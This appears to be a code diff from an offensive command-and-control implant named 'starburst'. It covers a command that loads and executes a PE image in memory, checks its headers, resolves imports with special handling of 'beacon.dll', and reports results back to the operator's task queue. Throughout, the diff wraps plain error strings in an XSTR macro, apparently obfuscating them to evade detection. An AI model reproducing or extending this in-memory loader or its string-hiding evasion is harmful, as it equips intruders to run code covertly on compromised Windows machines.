@@ -518,7 +518,7 @@ auto declfn starburst::cmd_execute_bofpe(
 
     if ( !pe_data || pe_len < sizeof(PE_DOS_HEADER) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no PE data" ) ) );
+            XSTR( "no PE data" ) );
         return;
     }
 
@@ -533,26 +533,26 @@ auto declfn starburst::cmd_execute_bofpe(
     auto dos = reinterpret_cast<PE_DOS_HEADER*>( pe_data );
     if ( dos->e_magic != PE_MAGIC_MZ ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid PE: bad MZ" ) ) );
+            XSTR( "invalid PE: bad MZ" ) );
         return;
     }
 
     if ( (uint32_t)dos->e_lfanew + sizeof(PE_NT_HEADERS64) > pe_len ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid PE: truncated" ) ) );
+            XSTR( "invalid PE: truncated" ) );
         return;
     }
 
     auto nt = reinterpret_cast<PE_NT_HEADERS64*>( pe_data + dos->e_lfanew );
     if ( nt->Signature != PE_SIGNATURE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid PE: bad signature" ) ) );
+            XSTR( "invalid PE: bad signature" ) );
         return;
     }
 
     if ( nt->OptionalHeader.Magic != PE_MAGIC_PE32PLUS ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "only x64 PE supported" ) ) );
+            XSTR( "only x64 PE supported" ) );
         return;
     }
 
@@ -567,7 +567,7 @@ auto declfn starburst::cmd_execute_bofpe(
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
     if ( !image_base ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualAlloc failed for PE" ) ) );
+            XSTR( "VirtualAlloc failed for PE" ) );
         return;
     }
 
@@ -645,8 +645,8 @@ auto declfn starburst::cmd_execute_bofpe(
 
         while ( desc->Name != 0 ) {
             auto dll_name = reinterpret_cast<char*>( image_base + desc->Name );
-            bool is_beacon = _str_icmp( dll_name, "beacon.dll" ) ||
-                             _str_icmp( dll_name, "beacon" );
+            bool is_beacon = _str_icmp( dll_name, XSTR("beacon.dll") ) ||
+                             _str_icmp( dll_name, XSTR("beacon") );
 
             HMODULE h_mod = nullptr;
             if ( !is_beacon ) {
@@ -709,7 +709,7 @@ auto declfn starburst::cmd_execute_bofpe(
     if ( !import_ok ) {
         inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "import resolution failed" ) ) );
+            XSTR( "import resolution failed" ) );
         return;
     }
 
@@ -767,7 +767,7 @@ auto declfn starburst::cmd_execute_bofpe(
     if ( !entry_ptr ) {
         inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "entry point not found in exports" ) ) );
+            XSTR( "entry point not found in exports" ) );
         return;
     }
 
@@ -849,7 +849,7 @@ auto declfn starburst::cmd_execute_bofpe(
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
     } else if ( exec_ok ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "BOF-PE executed (no output)" ) ) );
+            XSTR( "BOF-PE executed (no output)" ) );
     } else if ( inst.coff.crash_code ) {
         char err[32] = { 'B','O','F','-','P','E',' ','c','r','a','s','h',':',' ','0','x' };
         uint32_t code = inst.coff.crash_code;
@@ -861,7 +861,7 @@ auto declfn starburst::cmd_execute_bofpe(
         queue_response( inst, task_uuid, RESPONSE_ERROR, err );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "BOF-PE timed out" ) ) );
+            XSTR( "BOF-PE timed out" ) );
     }
 
     // Cleanup
